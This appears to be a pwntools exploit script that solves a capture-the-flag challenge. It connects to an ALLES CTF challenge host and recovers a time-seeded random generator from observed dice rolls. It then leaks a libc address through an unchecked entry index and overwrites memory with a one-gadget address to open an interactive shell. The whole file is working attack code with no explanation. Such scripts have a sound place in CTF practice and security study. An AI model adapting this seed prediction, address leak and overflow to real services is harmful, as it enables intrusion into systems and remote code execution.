from pwn import *
import time
RANCTX = [4058668781, 1599297483, 1599297483, 1599297483]
func=0
entry=0

def ran_init(x):
    RANCTX[1] = x
    RANCTX[2] = x
    RANCTX[3] = x

    for i in range(0x13):
        rand()


def rand():

    v1 = (RANCTX[0] - ((RANCTX[1] << 27) | (RANCTX[1] >> 5))) % 2**64
    RANCTX[0] = (((RANCTX[2] << 17) | (RANCTX[2] >> 15)) ^ RANCTX[1]) % 2 ** 64
    RANCTX[1] = (RANCTX[3] + RANCTX[2]) % 2**64
    RANCTX[2] = (v1 + RANCTX[3]) % 2**64
    RANCTX[3] = (v1 + RANCTX[0]) % 2**64
    return RANCTX[3]


def rand_flag(seed):
    ran_init(seed)
    for i in range(3):
        if(i==1):
            fun=(rand() % (0x10000 - 8))
            global func
            func=fun
        elif(i==2):
            fun=(rand() % (0x10000 - 2040))
            global entry
            entry=fun
        else:
            rand()
    l = []
    for i in range(10):
        l.append((rand() % 6)+1)
    return l


if __name__ == "__main__":

    init_time = int(time.time())
    io = process(['ncat', '--ssl','7b000000b645776257a65069.challenges.broker4.allesctf.net', '1337'])
    #io = process('./back',env={"LD_PRELOAD":"./libc.so.6"})
    io.recv()
    l = []
    for i in range(10):
        io.sendline('1')
        io.recvuntil('[>] Threw dice: ')
        s = io.recv().split()[0]
        l.append(int(s))

    real_time = 0
    for i in range(1000000):
        x = rand_flag(init_time-i)
        if x == l:
            real_time = init_time - i
            break
    if io.can_recv() : io.recv()
    real_list = []
    rn =0
    count=0
    while True:
        rn = rand() % (0x10000 - 100)
        if(rn >= func-90 and rn <=func):
            offset =func-rn
            break
        count+=1
    io.sendline()
    print("Func "+str(func))
    print("Entry "+str(entry))
    print("Count "+str(count))
    if(entry%8!=0 or count>20):
        exit(0)
    for i in range(count-1):
        io.sendlineafter("Select menu Item:\n","1")
    io.sendlineafter("Select menu Item:\n","2")
    io.sendlineafter("Enter your data (max length: 100):","\x08")
    io.sendlineafter("Select menu Item:\n","3")
    fun = 263687-(entry/8)
    io.sendlineafter("Enter entry index (max: 0):",str(fun))
    io.recvuntil(". ")
    leak = u64(io.recv(6)+"\x00\x00")-0x19bfb8-0x554e0
    #system = leak+0x55410
    print(hex(leak),offset)
    #gdb.attach(io)
    io.sendlineafter("Select menu Item:\n","2")
    io.sendlineafter("Enter your data (max length: 100):",("a"*offset+p64(leak+0x10afa9)))
    io.interactive()
